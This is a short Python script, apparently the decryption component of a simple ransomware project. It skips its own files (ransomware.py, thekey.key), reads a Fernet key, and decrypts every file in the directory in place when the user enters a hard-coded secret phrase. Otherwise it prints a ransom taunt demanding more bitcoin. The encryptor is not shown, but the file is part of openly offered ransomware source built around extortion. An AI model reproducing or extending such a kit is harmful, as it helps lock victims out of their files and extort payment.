import os
from cryptography.fernet import Fernet

files =[]

for file in os.listdir():
		if file == 'ransomware.py' or file == 'thekey.key' or file == 'decrypt.py':
				continue
		if os.path.isfile(file):
				files.append(file)

print(files)

with open('thekey.key', 'rb') as key:
		secretkey = key.read()

secret_phrase = 'dib'

user_phrase = input('Enter the secret phrase to decrypt all your files:\n')

if user_phrase == secret_phrase:								
	for file in files:
			with open(file, 'rb') as thefile:
					contents = thefile.read()
			contents_decrypted = Fernet(secretkey).decrypt(contents)
			with open(file, 'wb') as thefile:
					thefile.write(contents_decrypted)
	print('Congrats, your files are decrypted! ')
else:
	print('Sorry, wrong secret phrase. Send me more bitcoin!')

	
	